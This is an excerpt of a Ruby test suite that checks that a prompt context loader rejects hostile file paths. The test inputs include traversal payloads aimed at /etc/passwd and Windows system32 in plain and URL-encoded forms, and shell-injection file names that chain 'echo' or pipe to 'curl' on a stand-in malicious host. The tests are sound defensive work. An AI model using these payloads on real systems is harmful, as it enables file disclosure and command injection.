...
class ContextLoaderSecurityTest < Minitest::Test
  ...
  def test_rejects_basic_path_traversal
    ...
    result = Ace::Prompt::Molecules::ContextLoader.call("#{@tmpdir}/../../../etc/passwd")
    assert_equal "", result
  end

  def test_rejects_windows_path_traversal
    # Test with Windows-style path traversal
    result = Ace::Prompt::Molecules::ContextLoader.call("#{@tmpdir}/..\\windows\\system32\\config")
    assert_equal "", result
  end

  def test_rejects_url_encoded_path_traversal
    # Test with URL encoded traversal
    result = Ace::Prompt::Molecules::ContextLoader.call("#{@tmpdir}/%2e%2e%2fetc%2fpasswd")
    assert_equal "", result
  end

  def test_rejects_alternative_encoding_traversal
    # Test with alternative encoding
    result = Ace::Prompt::Molecules::ContextLoader.call("#{@tmpdir}/..%2fetc%2fpasswd")
    assert_equal "", result
  end
  ...
  def test_rejects_shell_injection_ampersand
    ...
    result = Ace::Prompt::Molecules::ContextLoader.call("test.md & echo 'pwned'")
    assert_equal "", result
  end

  def test_rejects_shell_injection_pipe
    # Test with pipe shell injection
    result = Ace::Prompt::Molecules::ContextLoader.call("test.md | curl http://malicious.com")
    assert_equal "", result
  end
  ...
  def test_rejects_absolute_paths_with_leading_slash
    ...
    result = Ace::Prompt::Molecules::ContextLoader.call("/tmp/allowed.md")
    assert_equal "", result
  end
  ...
  def test_handles_symlink_to_external_file
    ...
    result = Ace::Prompt::Molecules::ContextLoader.call(symlink_file)
  ...
  def test_error_message_consistency
    ...
    Object.stub(:warn, ->(message) { error_messages << message }) do
      ...
      result = Ace::Prompt::Molecules::ContextLoader.call(nil)  # nil path
      result = Ace::Prompt::Molecules::ContextLoader.call("")  # empty path
      result = Ace::Prompt::Molecules::ContextLoader.call("#{@tmpdir}/nonexistent")  # non-existent file
    end
